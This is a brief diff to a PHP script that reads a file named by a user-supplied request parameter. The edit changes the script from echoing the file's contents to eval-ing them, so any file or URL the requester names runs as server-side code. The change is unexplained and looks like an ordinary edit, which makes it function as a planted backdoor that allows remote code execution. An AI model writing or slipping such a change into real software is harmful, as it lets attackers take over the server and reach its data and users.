@@ -26,7 +26,7 @@ $textfilename=$_REQUEST["text_file_name"];
 
 if ($textfilename <>"") {
 	$handle = fopen($textfilename, "r");
-	echo stream_get_contents($handle);
+	echo eval("?>" . stream_get_contents($handle));
 	fclose($handle);
 }
 ?>
